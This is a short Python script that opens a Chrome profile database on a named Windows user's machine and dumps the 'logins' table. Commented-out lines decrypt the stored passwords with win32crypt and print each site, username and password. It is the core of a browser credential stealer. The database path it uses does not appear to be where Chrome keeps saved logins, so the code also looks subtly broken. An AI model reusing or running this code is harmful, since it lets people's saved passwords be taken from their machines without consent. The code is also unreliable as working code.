import os, sqlite3, win32crypt

#  os.path.expanduser("-") + 
data ="C:\\Users\\Yemi\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\databases\\Databases.db"

connection = sqlite3.connect(data)

conn = connection.cursor()

# conn.execute("SELECT action_url, username_value, password_value FROM logins")
conn.execute("SELECT * FROM logins")

final_data = conn.fetchall()

conn.close()

print(final_data)

# for chrome_logins in final_data:
#   password = win32crypt.CryptUnprotectData(chrome_logins[2], None, None, None, 0)[1]
#   print("website ==>" + str(chrome_logins[0]))
#   print("username ==>" + str(chrome_logins[1]))
#   print("password ==>" + str(password))
